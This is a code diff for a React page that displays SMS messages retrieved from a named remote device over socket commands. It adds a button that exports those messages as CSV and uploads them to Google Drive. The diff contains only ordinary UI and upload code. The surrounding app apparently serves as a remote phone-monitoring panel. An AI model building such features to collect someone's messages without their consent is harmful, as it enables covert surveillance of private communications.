@@ -5,10 +5,11 @@ import { useSearchParams, useRouter } from 'next/navigation';
 import { useNotification } from '@/context/NotificationProvider';
 import { useGlobalContext } from '@/context/GlobalProvider';
 import { consumeTrialAccess } from '@/lib/appwrite';
+import { uploadDriveFile } from '@/lib/drive-client';
 import { buildPremiumRoute, PREMIUM_TRIAL_FEATURE_IDS } from '@/lib/premium';
 import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
 import { exportToCSV } from '@/lib/utils';
-import { MessageSquare, ArrowLeft, Download, RefreshCw, Search, X, Copy, Check, ChevronRight } from 'lucide-react';
+import { MessageSquare, ArrowLeft, Download, RefreshCw, Search, X, Copy, Check, ChevronRight, CloudUpload } from 'lucide-react';
 
 interface SMS {
     id: string;
@@ -31,7 +32,20 @@ export default function SmsPage() {
     const [searchQuery, setSearchQuery] = useState('');
     const [selectedSms, setSelectedSms] = useState<SMS | null>(null);
     const [copied, setCopied] = useState(false);
+    const [isUploading, setIsUploading] = useState(false);
     const [trialConsumed, setTrialConsumed] = useState(false);
+
+    const buildCsvContent = () => {
+        const rows = ['Phone Number,Message'];
+
+        smsList.forEach((sms) => {
+            const phoneNo = String(sms.phoneNo || 'Unknown').replace(/"/g, '""');
+            const msg = String(sms.msg || '').replace(/"/g, '""').replace(/\n/g, ' ');
+            rows.push(`"${phoneNo}","${msg}"`);
+        });
+
+        return rows.join('\n');
+    };
 
     const ensureTrialOnFirstUse = async () => {
         if (isPremium) return true;
@@ -118,6 +132,33 @@ export default function SmsPage() {
         showSuccess('Exported', 'Messages saved as CSV');
     };
 
+    const handleDriveUpload = async () => {
+        if (smsList.length === 0) {
+            showError('No Data', 'Load messages before uploading to Google Drive.');
+            return;
+        }
+
+        try {
+            setIsUploading(true);
+            const fileName = `SMS_${deviceName}_${new Date().toISOString().split('T')[0]}.csv`;
+            const blob = new Blob([buildCsvContent()], { type: 'text/csv' });
+
+            await uploadDriveFile({
+                deviceName,
+                feature: 'sms',
+                fileName,
+                mimeType: 'text/csv',
+                file: blob,
+            });
+
+            showSuccess('Uploaded to Drive', 'SMS export uploaded to Google Drive.');
+        } catch (error) {
+            showError('Drive Upload Failed', error instanceof Error ? error.message : 'Unable to upload SMS to Google Drive.');
+        } finally {
+            setIsUploading(false);
+        }
+    };
+
     const handleCopy = async (text: string) => {
         await navigator.clipboard.writeText(text);
         setCopied(true);
@@ -147,9 +188,18 @@ export default function SmsPage() {
                                 <p className="text-gray-400">{deviceName}</p>
                             </div>
                         </div>
-                        <button onClick={handleExport} className="p-3 rounded-full bg-white/10">
-                            <Download className="w-5 h-5 text-white" />
-                        </button>
+                        <div className="flex items-center gap-2">
+                            <button
+                                onClick={handleDriveUpload}
+                                disabled={isUploading || smsList.length === 0}
+                                className="p-3 rounded-full bg-emerald-500/20 border border-emerald-400/20 disabled:opacity-50"
+                            >
+                                <CloudUpload className={`w-5 h-5 text-emerald-200 ${isUploading ? 'animate-pulse' : ''}`} />
+                            </button>
+                            <button onClick={handleExport} className="p-3 rounded-full bg-white/10">
+                                <Download className="w-5 h-5 text-white" />
+                            </button>
+                        </div>
                     </div>
                 </div>
             </div>
